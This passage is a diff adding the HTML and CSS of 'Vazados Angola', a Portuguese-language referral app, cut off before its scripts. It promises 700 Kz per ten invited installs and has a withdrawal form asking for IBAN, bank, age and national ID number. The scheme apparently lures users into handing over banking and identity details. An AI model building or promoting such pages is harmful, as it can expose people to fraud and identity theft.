@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Vazados Angola</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --red: #cc0017;
+  --red2: #ff1a32;
+  --gold: #f0a500;
+  --gold2: #ffc233;
+  --black: #080808;
+  --bg: #0e0e0e;
+  --bg2: #151515;
+  --bg3: #1c1c1c;
+  --bg4: #242424;
+  --line: #2c2c2c;
+  --line2: #383838;
+  --txt: #f2f2f2;
+  --muted: #7a7a7a;
+  --muted2: #555;
+  --green: #00b84a;
+  --green2: #00e060;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+body{
+  font-family:'Sora',sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  min-height:100vh;
+  overflow-x:hidden;
+  max-width:480px;
+  margin:0 auto;
+  position:relative;
+}
+
+/* ─── NOISE OVERLAY ─── */
+body::before{
+  content:'';
+  position:fixed;inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:0;opacity:.4;
+}
+
+/* ─── SCREENS ─── */
+.screen{display:none;min-height:100vh;flex-direction:column;position:relative;z-index:1}
+.screen.active{display:flex}
+
+/* ─── LOADING ─── */
+#screen-loading{
+  background:var(--black);
+  align-items:center;justify-content:center;
+  flex-direction:column;gap:24px;
+}
+.loader-logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:52px;letter-spacing:4px;
+  color:var(--red);
+  animation:pulse 1.5s ease-in-out infinite;
+}
+.loader-logo span{color:var(--gold)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.loader-dots{display:flex;gap:8px}
+.loader-dots i{
+  width:8px;height:8px;border-radius:50%;
+  background:var(--red);
+  animation:bounce 1.2s ease-in-out infinite;
+}
+.loader-dots i:nth-child(2){animation-delay:.2s;background:var(--gold)}
+.loader-dots i:nth-child(3){animation-delay:.4s}
+@keyframes bounce{0%,80%,100%{transform:scale(0.6);opacity:.5}40%{transform:scale(1);opacity:1}}
+
+/* ─── LANDING ─── */
+#screen-landing{
+  background:
+    radial-gradient(ellipse 80% 60% at 50% -10%, rgba(204,0,23,.18) 0%, transparent 70%),
+    radial-gradient(ellipse 60% 40% at 100% 100%, rgba(240,165,0,.08) 0%, transparent 60%),
+    var(--black);
+  align-items:center;justify-content:center;
+  text-align:center;padding:40px 28px 60px;
+  gap:0;
+}
+.landing-flag{
+  display:flex;gap:5px;justify-content:center;
+  margin-bottom:22px;
+}
+.landing-flag span{
+  height:4px;border-radius:2px;
+  animation:flagSlide .6s ease both;
+}
+.landing-flag span:nth-child(1){width:48px;background:#cc0017;animation-delay:.1s}
+.landing-flag span:nth-child(2){width:20px;background:#f0a500;animation-delay:.2s}
+.landing-flag span:nth-child(3){width:48px;background:#000;border:1px solid #333;animation-delay:.3s}
+@keyframes flagSlide{from{width:0;opacity:0}to{opacity:1}}
+
+.landing-logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:72px;line-height:.95;
+  letter-spacing:3px;
+  color:var(--red);
+  text-shadow:0 0 60px rgba(204,0,23,.4),0 0 120px rgba(204,0,23,.15);
+  animation:logoIn .8s cubic-bezier(.16,1,.3,1) both;
+  animation-delay:.3s;
+}
+.landing-logo em{
+  color:var(--gold);font-style:normal;
+  display:block;font-size:52px;letter-spacing:8px;
+}
+@keyframes logoIn{from{opacity:0;transform:scale(.85) translateY(10px)}to{opacity:1;transform:none}}
+
+.landing-sub{
+  font-size:10px;letter-spacing:5px;color:var(--muted);
+  text-transform:uppercase;margin:10px 0 32px;
+  animation:fadeUp .6s ease both;animation-delay:.5s;
+}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+.reward-card{
+  background:rgba(240,165,0,.07);
+  border:1px solid rgba(240,165,0,.2);
+  border-radius:16px;
+  padding:18px 28px;
+  margin-bottom:36px;
+  animation:fadeUp .6s ease both;animation-delay:.6s;
+}
+.reward-card .r-top{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:42px;color:var(--gold);
+  line-height:1;
+  text-shadow:0 0 20px rgba(240,165,0,.3);
+}
+.reward-card .r-bot{
+  font-size:12px;color:var(--muted);margin-top:4px;
+}
+.reward-card .r-bot strong{color:var(--gold2)}
+
+.landing-btns{
+  display:flex;flex-direction:column;gap:10px;
+  width:100%;
+  animation:fadeUp .6s ease both;animation-delay:.7s;
+}
+
+/* ─── BUTTONS ─── */
+.btn{
+  width:100%;padding:15px;border-radius:12px;
+  font-family:'Sora',sans-serif;font-size:13px;
+  font-weight:700;letter-spacing:1.5px;
+  text-transform:uppercase;border:none;
+  cursor:pointer;transition:all .2s;
+  position:relative;overflow:hidden;
+}
+.btn::after{
+  content:'';position:absolute;inset:0;
+  background:rgba(255,255,255,0);
+  transition:background .2s;
+}
+.btn:active::after{background:rgba(255,255,255,.08)}
+.btn-red{background:var(--red);color:#fff}
+.btn-red:hover{background:var(--red2);transform:translateY(-1px)}
+.btn-gold{background:var(--gold);color:#000}
+.btn-gold:hover{background:var(--gold2)}
+.btn-outline{
+  background:transparent;
+  border:1px solid var(--line2);
+  color:var(--muted);
+}
+.btn-outline:hover{border-color:var(--red);color:var(--red)}
+.btn-ghost{
+  background:transparent;border:none;
+  color:var(--muted);font-size:12px;
+  padding:8px;width:auto;letter-spacing:.5px;
+}
+.btn-green{background:var(--green);color:#000}
+.btn-green:hover{background:var(--green2)}
+.btn-disabled{
+  background:var(--bg3);color:var(--muted2);
+  cursor:not-allowed;
+}
+.btn-sm{padding:9px 16px;font-size:11px;border-radius:8px;width:auto}
+
+/* ─── SCREEN HEADER ─── */
+.s-header{
+  background:var(--bg2);
+  border-bottom:1px solid var(--line);
+  padding:16px 20px;
+  display:flex;align-items:center;gap:14px;
+  position:sticky;top:0;z-index:50;
+}
+.s-back{
+  background:var(--bg3);border:none;
+  width:36px;height:36px;border-radius:50%;
+  color:var(--txt);font-size:18px;
+  cursor:pointer;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;transition:background .2s;
+}
+.s-back:hover{background:var(--bg4)}
+.s-title{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:22px;letter-spacing:1.5px;color:var(--txt);
+}
+
+/* ─── APP HEADER ─── */
+.app-header{
+  background:var(--bg2);
+  border-bottom:1px solid var(--line);
+  padding:12px 18px;
+  display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:50;
+}
+.ah-logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:26px;letter-spacing:2px;color:var(--red);
+}
+.ah-logo em{color:var(--gold);font-style:normal}
+.ah-user{text-align:right;line-height:1.3}
+.ah-user strong{
+  display:block;font-size:13px;
+  color:var(--gold);font-weight:700;
+}
+.ah-user span{font-size:11px;color:var(--muted)}
+
+/* ─── CONTENT ─── */
+.content{
+  flex:1;
+  padding:20px 16px 100px;
+  overflow-y:auto;
+}
+
+/* ─── CARDS ─── */
+.card{
+  background:var(--bg2);
+  border:1px solid var(--line);
+  border-radius:16px;
+  padding:20px;
+  margin-bottom:14px;
+}
+.card-accent{
+  border-top:2px solid var(--red);
+}
+.card-gold-accent{
+  border-top:2px solid var(--gold);
+}
+.card-title{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:18px;letter-spacing:1px;
+  color:var(--gold);
+  margin-bottom:16px;
+  display:flex;align-items:center;gap:8px;
+}
+.card-title .ct-icon{font-size:16px}
+
+/* ─── FIELDS ─── */
+.field{margin-bottom:14px}
+.field label{
+  display:block;font-size:11px;
+  color:var(--muted);margin-bottom:7px;
+  font-weight:600;text-transform:uppercase;
+  letter-spacing:.8px;
+}
+.field input,.field select,.field textarea{
+  width:100%;
+  background:var(--bg3);
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:13px 15px;
+  color:var(--txt);
+  font-family:'Sora',sans-serif;font-size:14px;
+  outline:none;transition:border-color .2s,box-shadow .2s;
+}
+.field input:focus,.field select:focus,.field textarea:focus{
+  border-color:var(--red);
+  box-shadow:0 0 0 3px rgba(204,0,23,.1);
+}
+.field select option{background:var(--bg3)}
+.field input::placeholder{color:var(--muted2)}
+
+/* ─── STATS ROW ─── */
+.stats-row{
+  display:grid;grid-template-columns:1fr 1fr;
+  gap:10px;margin-bottom:14px;
+}
+.stat-box{
+  background:var(--bg3);
+  border:1px solid var(--line);
+  border-radius:12px;
+  padding:16px 12px;text-align:center;
+}
+.stat-box .sv{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:38px;line-height:1;
+  color:var(--gold);
+}
+.stat-box .sl{
+  font-size:10px;color:var(--muted);
+  text-transform:uppercase;letter-spacing:.8px;
+  margin-top:4px;font-weight:600;
+}
+.stat-box.accent-red .sv{color:var(--red2)}
+
+/* ─── PROGRESS ─── */
+.prog-wrap{margin:16px 0}
+.prog-meta{
+  display:flex;justify-content:space-between;
+  font-size:12px;color:var(--muted);margin-bottom:8px;
+}
+.prog-meta strong{color:var(--txt)}
+.prog-track{
+  background:var(--bg3);border-radius:99px;
+  height:10px;overflow:hidden;
+  border:1px solid var(--line);
+}
+.prog-fill{
+  height:100%;border-radius:99px;
+  background:linear-gradient(90deg,var(--red) 0%,var(--gold) 100%);
+  transition:width .8s cubic-bezier(.16,1,.3,1);
+  position:relative;
+}
+.prog-fill::after{
+  content:'';
+  position:absolute;right:0;top:0;bottom:0;
+  width:4px;background:rgba(255,255,255,.5);
+  border-radius:2px;
+}
+
+/* ─── LINK BOX ─── */
+.link-box{
+  background:var(--bg3);
+  border:1px solid var(--line);
+  border-radius:10px;
+  padding:12px 14px;
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:14px;
+}
+.link-box .lb-url{
+  flex:1;font-size:12px;color:var(--muted);
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+.copy-btn{
+  background:var(--red);color:#fff;
+  border:none;border-radius:8px;
+  padding:8px 16px;font-size:11px;font-weight:700;
+  cursor:pointer;white-space:nowrap;letter-spacing:.5px;
+  font-family:'Sora',sans-serif;text-transform:uppercase;
+  transition:all .2s;flex-shrink:0;
+}
+.copy-btn:hover{background:var(--red2)}
+.copy-btn.ok{background:var(--green)}
+
+/* ─── BOTTOM NAV ─── */
+.bottom-nav{
+  position:fixed;bottom:0;left:50%;
+  transform:translateX(-50%);
+  width:100%;max-width:480px;
+  background:rgba(14,14,14,.95);
+  backdrop-filter:blur(20px);
+  border-top:1px solid var(--line);
+  display:flex;z-index:100;
+}
+.nav-btn{
+  flex:1;padding:12px 4px 14px;
+  background:none;border:none;
+  color:var(--muted2);
+  cursor:pointer;transition:color .2s;
+  display:flex;flex-direction:column;align-items:center;gap:4px;
+  font-family:'Sora',sans-serif;font-size:10px;font-weight:600;
+  text-transform:uppercase;letter-spacing:.5px;
+}
+.nav-btn .ni{font-size:20px;line-height:1}
+.nav-btn.on{color:var(--red)}
+.nav-btn.on .ni{filter:drop-shadow(0 0 6px rgba(204,0,23,.6))}
+
+/* ─── TEN BLOCKS ─── */
+.ten-group{
+  background:var(--bg3);
+  border:1px solid var(--line);
+  border-radius:12px;padding:14px;
+  margin-bottom:10px;
+}
+.ten-group-hd{
+  display:flex;justify-content:space-between;
+  align-items:center;margin-bottom:10px;
+}
+.ten-group-hd .gn{font-size:12px;color:var(--muted);font-weight:600}
+.ten-group-hd .gs{font-size:11px;font-weight:700;padding:4px 10px;border-radius:6px}
+.gs-done{background:rgba(0,184,74,.12);color:var(--green)}
+.gs-prog{background:rgba(240,165,0,.12);color:var(--gold)}
+.ten-dots{display:flex;gap:5px;flex-wrap:wrap}
+.ten-dot{
+  width:28px;height:28px;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;transition:all .3s;
+}
+.ten-dot.filled{background:rgba(240,165,0,.15);border:1px solid rgba(240,165,0,.3)}
+.ten-dot.empty{background:var(--bg4);border:1px solid var(--line)}
+
+/* ─── NORMAS ─── */
+.norma-item{margin-bottom:20px}
+.norma-item h3{
+  font-family:'Bebas Neue',sans-serif;font-size:17px;
+  letter-spacing:1px;color:var(--red2);
+  margin-bottom:8px;
+  border-left:3px solid var(--red);
+  padding-left:10px;
+}
+.norma-item p,.norma-item li{
+  font-size:13px;color:#bbb;line-height:1.8;
+}
+.norma-item ul{padding-left:16px}
+.norma-item li{margin-bottom:2px}
+.norma-highlight{
+  background:linear-gradient(135deg,rgba(204,0,23,.1),rgba(240,165,0,.08));
+  border:1px solid rgba(240,165,0,.25);
+  border-radius:12px;padding:16px;text-align:center;
+  font-size:15px;font-weight:700;color:var(--gold);
+  margin:16px 0;
+}
+.norma-highlight small{display:block;font-size:12px;color:var(--muted);margin-top:4px;font-weight:400}
+
+/* ─── TOAST ─── */
+.toast{
+  position:fixed;
+  top:80px;left:50%;
+  transform:translateX(-50%) translateY(-10px);
+  background:var(--bg4);
+  border:1px solid var(--line2);
+  color:var(--txt);
+  padding:11px 24px;border-radius:99px;
+  font-size:13px;font-weight:600;
+  z-index:999;opacity:0;
+  transition:all .25s cubic-bezier(.16,1,.3,1);
+  white-space:nowrap;
+  box-shadow:0 8px 24px rgba(0,0,0,.4);
+  pointer-events:none;
+}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.t-green{background:rgba(0,184,74,.15);border-color:rgba(0,184,74,.3);color:var(--green2)}
+.toast.t-red{background:rgba(204,0,23,.15);border-color:rgba(204,0,23,.3);color:var(--red2)}
+
+/* ─── MODAL ─── */
+.overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.75);
+  backdrop-filter:blur(4px);
+  z-index:200;display:none;
+  align-items:flex-end;justify-content:center;
+}
+.overlay.open{display:flex}
+.modal{
+  background:var(--bg2);
+  border-radius:24px 24px 0 0;
+  border-top:2px solid var(--red);
+  padding:24px 20px 44px;
+  width:100%;max-width:480px;
+  max-height:90vh;overflow-y:auto;
+  animation:slideUp .3s cubic-bezier(.16,1,.3,1);
+}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:none}}
+.modal-title{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:24px;letter-spacing:1px;
+  color:var(--gold);margin-bottom:6px;
+}
+.modal-sub{font-size:12px;color:var(--muted);margin-bottom:20px}
+.saque-available{
+  background:rgba(0,184,74,.08);
+  border:1px solid rgba(0,184,74,.2);
+  border-radius:10px;padding:12px 16px;
+  margin-bottom:18px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.saque-available .sa-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+.saque-available .sa-val{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:28px;color:var(--green);line-height:1;
+}
+
+/* ─── ADM ─── */
+.adm-user-card{
+  background:var(--bg3);
+  border:1px solid var(--line);
+  border-radius:12px;padding:14px 16px;
+  margin-bottom:10px;
+  display:flex;align-items:center;justify-content:space-between;
+  cursor:pointer;transition:border-color .2s;
+}
+.adm-user-card:hover{border-color:var(--line2)}
+.adm-user-card .auc-name{font-size:14px;font-weight:600;margin-bottom:2px}
+.adm-user-card .auc-phone{font-size:12px;color:var(--muted)}
+.adm-user-card .auc-pts{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:32px;color:var(--gold);
+  line-height:1;text-align:right;
+}
+.adm-user-card .auc-kz{
+  font-size:11px;color:var(--green);
+  font-weight:600;text-align:right;
+}
+
+/* ─── RANK BADGE ─── */
+.rank-badge{
+  display:inline-block;
+  font-size:10px;font-weight:700;letter-spacing:.5px;
+  padding:3px 8px;border-radius:5px;
+  text-transform:uppercase;
+  margin-left:8px;
+}
+.rb-1{background:rgba(240,165,0,.15);color:var(--gold)}
+.rb-2{background:rgba(200,200,200,.1);color:#ccc}
+.rb-3{background:rgba(180,120,60,.15);color:#c87a3c}
+
+/* ─── INFO BOX ─── */
+.info-box{
+  background:var(--bg3);
+  border-left:3px solid var(--gold);
+  border-radius:0 10px 10px 0;
+  padding:12px 14px;
+  font-size:13px;color:#bbb;
+  margin-bottom:14px;
+  line-height:1.7;
+}
+.info-box strong{color:var(--gold)}
+
+/* ─── DIVIDER ─── */
+.divider{
+  border:none;
+  border-top:1px solid var(--line);
+  margin:16px 0;
+}
+
+/* ─── EMPTY STATE ─── */
+.empty-state{
+  text-align:center;
+  padding:40px 20px;
+  color:var(--muted);
+}
+.empty-state .es-icon{font-size:48px;margin-bottom:12px;opacity:.4}
+.empty-state p{font-size:14px;line-height:1.6}
+
+/* ─── SPINNER ─── */
+.spin{
+  width:18px;height:18px;border-radius:50%;
+  border:2px solid rgba(255,255,255,.2);
+  border-top-color:#fff;
+  animation:spin .7s linear infinite;
+  display:inline-block;vertical-align:middle;margin-right:6px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div class="toast" id="toast"></div>
+
+<!-- ═══════════════════════════════
+     LOADING
+════════════════════════════════ -->
+<div class="screen active" id="screen-loading">
+  <div class="loader-logo">VAZADOS <span>AO</span></div>
+  <div class="loader-dots">
+    <i></i><i></i><i></i>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     LANDING
+════════════════════════════════ -->
+<div class="screen" id="screen-landing">
+  <div class="landing-flag">
+    <span></span><span></span><span></span>
+  </div>
+  <div class="landing-logo">
+    VAZADOS
+    <em>ANGOLA</em>
+  </div>
+  <p class="landing-sub">Convide · Ganhe · Saque</p>
+  <div class="reward-card">
+    <div class="r-top">700 Kz</div>
+    <div class="r-bot">a cada <strong>10 amigos</strong> que instalarem</div>
+  </div>
+  <div class="landing-btns">
+    <button class="btn btn-red" onclick="showScreen('screen-register')">
+      Criar Conta
+    </button>
+    <button class="btn btn-outline" onclick="showScreen('screen-login')">
+      Já tenho conta — Entrar
+    </button>
+    <button class="btn-ghost" onclick="showScreen('screen-adm-login')">🔐 Acesso ADM</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     REGISTER
+════════════════════════════════ -->
+<div class="screen" id="screen-register">
+  <div class="s-header">
+    <button class="s-back" onclick="showScreen('screen-landing')">←</button>
+    <span class="s-title">CRIAR CONTA</span>
+  </div>
+  <div class="content">
+    <div class="card card-accent">
+      <div class="card-title"><span class="ct-icon">📱</span> Os seus dados</div>
+      <div class="field">
+        <label>Número de Telefone</label>
+        <input type="tel" id="reg-phone" placeholder="9XXXXXXXX" maxlength="9">
+      </div>
+      <div class="field">
+        <label>Nome Completo</label>
+        <input type="text" id="reg-name" placeholder="O seu nome">
+      </div>
+      <div class="field">
+        <label>Criar Senha</label>
+        <input type="password" id="reg-pass" placeholder="Mínimo 6 caracteres">
+      </div>
+      <button class="btn btn-red" id="reg-btn" onclick="doRegister()">Criar Conta</button>
+    </div>
+    <p style="text-align:center;font-size:13px;color:var(--muted);margin-top:8px">
+      Já tem conta?
+      <span style="color:var(--red);cursor:pointer;font-weight:600" onclick="showScreen('screen-login')"> Entrar</span>
+    </p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     LOGIN
+════════════════════════════════ -->
+<div class="screen" id="screen-login">
+  <div class="s-header">
+    <button class="s-back" onclick="showScreen('screen-landing')">←</button>
+    <span class="s-title">ENTRAR</span>
+  </div>
+  <div class="content">
+    <div class="card card-accent">
+      <div class="card-title"><span class="ct-icon">🔓</span> Acesso</div>
+      <div class="field">
+        <label>Número de Telefone</label>
+        <input type="tel" id="login-phone" placeholder="9XXXXXXXX" maxlength="9">
+      </div>
+      <div class="field">
+        <label>Senha</label>
+        <input type="password" id="login-pass" placeholder="A sua senha">
+      </div>
+      <button class="btn btn-red" id="login-btn" onclick="doLogin()">Entrar</button>
+    </div>
+    <p style="text-align:center;font-size:13px;color:var(--muted);margin-top:8px">
+      Não tem conta?
+      <span style="color:var(--red);cursor:pointer;font-weight:600" onclick="showScreen('screen-register')"> Criar conta</span>
+    </p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     APP
+════════════════════════════════ -->
+<div class="screen" id="screen-app">
+  <div class="app-header">
+    <div class="ah-logo">VAZ<em>AO</em></div>
+    <div class="ah-user">
+      <strong id="ah-name">—</strong>
+      <span id="ah-phone">—</span>
+    </div>
+  </div>
+
+  <!-- HOME TAB -->
+  <div class="content" id="tab-home">
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="sv" id="s-convites">0</div>
+        <div class="sl">Convidados</div>
+      </div>
+      <div class="stat-box accent-red">
+        <div class="sv" id="s-kz">0</div>
+        <div class="sl">Kz Ganhos</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="ct-icon">📊</span> Progresso para Saque</div>
+      <div class="prog-wrap">
+        <div class="prog-meta">
+          <span>Mínimo 30 convidados</span>
+          <strong id="prog-txt">0/30</strong>
+        </div>
+        <div class="prog-track">
+          <div class="prog-fill" id="prog-fill" style="width:0%"></div>
+        </div>
+      </div>
+      <div class="info-box">
+        Cada <strong>10 pontos</strong> = <strong>700 Kz</strong>. Acumule e saque quando quiser!
+      </div>
+      <button class="btn btn-disabled" id="btn-saque" onclick="tryOpenSaque()">
+        💸 Sacar Ganhos
+      </button>
+    </div>
+  </div>
+
+  <!-- LINK TAB -->
+  <div class="content" id="tab-link" style="display:none">
+    <div class="card card-gold-accent">
+      <div class="card-title"><span class="ct-icon">🔗</span> O Seu Link de Convite</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:14px;line-height:1.6">
+        Partilhe este link. Cada pessoa que aceder é registada como seu convidado.
+      </p>
+      <div class="link-box">
+        <span class="lb-url" id="link-url">—</span>
+        <button class="copy-btn" id="copy-btn" onclick="copyLink()">Copiar</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="ct-icon">👥</span> Confirmação dos Convidados</div>
+      <div class="stats-row" style="margin-bottom:14px">
+        <div class="stat-box">
+          <div class="sv" id="lt-total">0</div>
+          <div class="sl">Total</div>
+        </div>
+        <div class="stat-box">
+          <div class="sv" id="lt-grupos">0</div>
+          <div class="sl">Grupos de 10</div>
+        </div>
+      </div>
+      <div id="ten-blocks">
+        <div class="empty-state">
+          <div class="es-icon">🔗</div>
+          <p>Partilhe o seu link<br>e os convidados aparecem aqui!</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- NORMAS TAB -->
+  <div class="content" id="tab-normas" style="display:none">
+    <div class="card card-accent">
+      <div style="text-align:center;margin-bottom:20px">
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--red);letter-spacing:2px">📜 NORMA DE GANHOS</div>
+        <div style="font-size:12px;color:var(--muted);margin-top:4px;letter-spacing:2px;text-transform:uppercase">Vazados Angola</div>
+      </div>
+      <div class="norma-item">
+        <h3>1. Objetivo</h3>
+        <p>Esta norma define as regras de ganhos dentro do aplicativo Vazados Angola, através do sistema de convites e instalação de novos usuários.</p>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>2. Como Funciona o Ganho</h3>
+        <ul>
+          <li>Cada usuário pode convidar amigos para instalar o aplicativo.</li>
+          <li>O convite deve resultar em instalação real do app.</li>
+          <li>O sistema contabiliza apenas instalações válidas.</li>
+        </ul>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>3. Recompensa</h3>
+        <p>A cada <strong style="color:var(--gold)">10 amigos</strong> que instalarem o aplicativo, o usuário recebe:</p>
+        <div class="norma-highlight">
+          ➡️ 700 Kz (setecentos kwanzas)
+          <small>O valor é acumulativo — 20 convites = 1.400 Kz</small>
+        </div>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>4. Condições para Validar Ganho</h3>
+        <ul>
+          <li>O amigo convidado deve instalar o app através do link do usuário.</li>
+          <li>O app deve ser aberto pelo novo usuário pelo menos uma vez.</li>
+          <li>Não são permitidas instalações falsas ou repetidas.</li>
+        </ul>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>5. Proibições</h3>
+        <ul>
+          <li>Criar contas falsas para ganhar dinheiro</li>
+          <li>Usar métodos automáticos ou ilegais</li>
+          <li>Tentar manipular o sistema</li>
+        </ul>
+        <p style="margin-top:8px;color:var(--red2)">👉 Contas suspeitas terão ganhos anulados.</p>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>6. Pagamento</h3>
+        <ul>
+          <li>Crédito interno no app ou método definido pela plataforma</li>
+          <li>O pagamento será feito após validação das instalações</li>
+        </ul>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>7. Atualizações</h3>
+        <p>O Vazados Angola pode alterar valores, atualizar regras ou suspender o programa a qualquer momento.</p>
+      </div>
+      <hr class="divider">
+      <div class="norma-item">
+        <h3>8. Aceitação</h3>
+        <p>Ao participar, o usuário aceita automaticamente todos os termos desta norma.</p>
+      </div>
+      <div class="norma-highlight" style="margin-top:20px">
+        💡 Resumo Rápido<br>
+        <small>Convide → 10 amigos instalam → Ganha 700 Kz → Repete e acumula 💰</small>
+      </div>
+    </div>
+  </div>
+
+  <!-- PERFIL TAB -->
+  <div class="content" id="tab-perfil" style="display:none">
+    <div class="card card-gold-accent">
+      <div class="card-title"><span class="ct-icon">👤</span> Meu Perfil</div>
+      <div class="field">
+        <label>Nome</label>
+        <input type="text" id="pf-name" readonly style="opacity:.6">
+      </div>
+      <div class="field">
+        <label>Telefone</label>
+        <input type="text" id="pf-phone" readonly style="opacity:.6">
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title"><span class="ct-icon">📈</span> Resumo da Conta</div>
+      <div class="stats-row">
+        <div class="stat-box">
+          <div class="sv" id="pf-convites">0</div>
+          <div class="sl">Convidados</div>
+        </div>
+        <div class="stat-box">
+          <div class="sv" id="pf-kz">0</div>
+          <div class="sl">Kz Ganhos</div>
+        </div>
+      </div>
+    </div>
+    <button class="btn btn-outline" onclick="doLogout()" style="margin-top:4px">Sair da Conta</button>
+  </div>
+
+  <!-- BOTTOM NAV -->
+  <nav class="bottom-nav">
+    <button class="nav-btn on" id="nav-home" onclick="switchTab('home')">
+      <span class="ni">🏠</span>Início
+    </button>
+    <button class="nav-btn" id="nav-link" onclick="switchTab('link')">
+      <span class="ni">🔗</span>Convite
+    </button>
+    <button class="nav-btn" id="nav-normas" onclick="switchTab('normas')">
+      <span class="ni">📜</span>Normas
+    </button>
+    <button class="nav-btn" id="nav-perfil" onclick="switchTab('perfil')">
+      <span class="ni">👤</span>Perfil
+    </button>
+  </nav>
+</div>
+
+<!-- ═══════════════════════════════
+     ADM LOGIN
+════════════════════════════════ -->
+<div class="screen" id="screen-adm-login">
+  <div class="s-header">
+    <button class="s-back" onclick="showScreen('screen-landing')">←</button>
+    <span class="s-title">PAINEL ADM</span>
+  </div>
+  <div class="content">
+    <div class="card card-accent">
+      <div class="card-title"><span class="ct-icon">🔐</span> Acesso Restrito</div>
+      <div class="field">
+        <label>Telefone ADM</label>
+        <input type="tel" id="adm-p" placeholder="934821771">
+      </div>
+      <div class="field">
+        <label>Senha ADM</label>
+        <input type="password" id="adm-s" placeholder="Senha">
+      </div>
+      <button class="btn btn-red" onclick="doAdmLogin()">Entrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     ADM PAINEL
+════════════════════════════════ -->
+<div class="screen" id="screen-adm">
+  <div class="s-header">
+    <button class="s-back" onclick="showScreen('screen-landing')">←</button>
+    <span class="s-title">GESTÃO ADM</span>
+  </div>
+  <div class="content">
+    <div class="stats-row" id="adm-stats">
+      <div class="stat-box">
+        <div class="sv" id="adm-total-users">—</div>
+        <div class="sl">Utilizadores</div>
+      </div>
+      <div class="stat-box accent-red">
+        <div class="sv" id="adm-total-kz">—</div>
+        <div class="sl">Kz Total</div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title"><span class="ct-icon">👥</span> Todos os Utilizadores</div>
+      <div id="adm-list">
+        <div class="loader-dots" style="justify-content:center;padding:20px">
+          <i></i><i></i><i></i>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     MODAL: SAQUE
+════════════════════════════════ -->
+<div class="overlay" id="modal-saque">
+  <div class="modal">
+    <div class="modal-title">💸 Solicitar Saque</div>
+    <div class="modal-sub">Preencha todos os campos para processar o saque</div>
+    <div class="saque-available">
+      <div>
+        <div class="sa-lbl">Saldo disponível</div>
+        <div class="sa-val" id="saque-saldo">0 Kz</div>
+      </div>
+      <div style="font-size:12px;color:var(--muted);text-align:right">
+        <span id="saque-pontos">0</span> convidados<br>
+        <span style="color:var(--green)">✓ Desbloqueado</span>
+      </div>
+    </div>
+    <div class="field"><label>IBAN</label><input type="text" id="s-iban" placeholder="AO06..."></div>
+    <div class="field"><label>Nome do Banco</label><input type="text" id="s-banco" placeholder="BFA, BAI, BIC, Atlântico..."></div>
+    <div class="field"><label>Número de Telefone</label><input type="tel" id="s-tel" placeholder="9XXXXXXXX"></div>
+    <div class="field"><label>Idade</label><input type="number" id="s-idade" placeholder="Ex: 22" min="16" max="99"></div>
+    <div class="field"><label>Número do BI</label><input type="text" id="s-bi" placeholder="000000000LA000"></div>
+    <div class="field"><label>Valor a Sacar (Kz)</label><input type="number" id="s-valor" placeholder="Ex: 700"></div>
